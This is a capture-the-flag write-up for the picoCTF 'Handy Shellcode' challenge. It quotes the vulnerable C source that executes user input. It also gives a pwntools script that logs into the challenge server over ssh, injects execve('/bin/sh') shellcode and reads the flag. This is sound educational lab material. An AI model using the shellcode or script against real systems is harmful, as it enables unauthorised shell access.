# Handy Shellcode (pwn-50) Writeup


- - - -
### Problem:
This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in `/problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5 on the shell server. Source.


- - - -
### Goal:
Pop a shell


- - - -
### Solution:
In this problem we're given the source code for the vulnerable binary.

The `vuln()` function (shown below) unsafely gets input from the user and prints it back out.

```c
void vuln(char *buf){
  gets(buf);
  puts(buf);
}
```

Once the binary calls the `vuln()` function, it then executes the input we provided. It does so by casting the address of `buf` to a function then invoking this function.

```c
((void (*)())buf)();
```

To solve this problem we simply need to provide shellcode to the input of `vuln()` so that it can be executed. The python script below sets up an ssh connection to the executable then sends shellcode which in this case is equivalent to `execve('/bin/sh', NULL, NULl)`.

```python
from pwn import *

# Setup
context.log_level = 'debug'
s = ssh(host='2019shell1.picoctf.com', user='thomasvn', password='XXX')
sh = s.process('/problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5/vuln')

# Shellcode
exploit = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
sh.sendlineafter('\n', exploit)
sh.sendlineafter('$ ', 'cd /problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5/')
sh.sendlineafter('$ ', 'cat flag.txt')
sh.interactive()
```


- - - -
### Sources:
http://shell-storm.org/shellcode/files/shellcode-827.php
